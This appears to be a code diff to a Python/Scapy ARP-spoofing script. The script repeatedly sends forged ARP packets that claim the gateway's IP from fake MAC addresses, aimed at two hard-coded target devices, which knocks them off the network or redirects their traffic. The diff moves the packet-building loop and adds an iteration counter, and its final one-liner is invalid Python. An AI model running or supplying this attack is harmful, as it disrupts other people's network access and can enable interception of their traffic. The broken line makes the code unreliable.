@@ -93,20 +93,22 @@ def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
     PKT = []
     
     #scanf the subnet
-    ScanfByArp(1,2)
+    ScanfByArp(3,1)
     for XM_mac in MAC:
         XM_ip = GetIpByMac(XM_mac)
-        #if the IP is not existed,pass it
-        if XM_ip is None:continue
         print("%s -> %s"%(XM_ip,XM_mac))
-        Temp_mac = GetForgedMac(MY_mac,PackNum)
-        Temp_ip = GetForgedIP(MY_ip,PackNum)
-        PKT_ = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
-        PKT.append(PKT_)
-    else : 
-        if len(PKT) is 0:print ("Target not found...");return
     cnt = 0
     while True:
+        PKT = []
+        for XM_mac in MAC:
+            XM_ip = GetIpByMac(XM_mac)
+            #if the IP is not existed,pass it
+            if XM_ip is None:continue
+            Temp_mac = GetForgedMac(MY_mac,PackNum)
+            PKT_ = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
+            PKT.append(PKT_)
+        else : 
+            if len(PKT) is 0:print ("Target not found...");return
         try:
             cnt += 1
             sendp(PKT,iface = Face);
@@ -146,11 +148,13 @@ def DelayForxMinute(Length=1,Print=True):
         time.sleep(60);num += 1
         if Print is True:print("Delaying now...%s"%num)
     else:print("Delay ended...")
-    
+
 if __name__ == "__main__":
     DelayForxMinute(0,True)
+    Counter = 0
     #the mac you want to attack
     TargetMac = ["04:e6:76:46:a6:f3","78:02:f8:34:4d:b5"]
     while True:
         EnsureWifiConnection("192.168.0.1","ens33",2)
         Attack_MAC("ens33","192.168.0.1",TargetMac,10,10,1)
+        Counter += 1;if Counter >= 1000:break
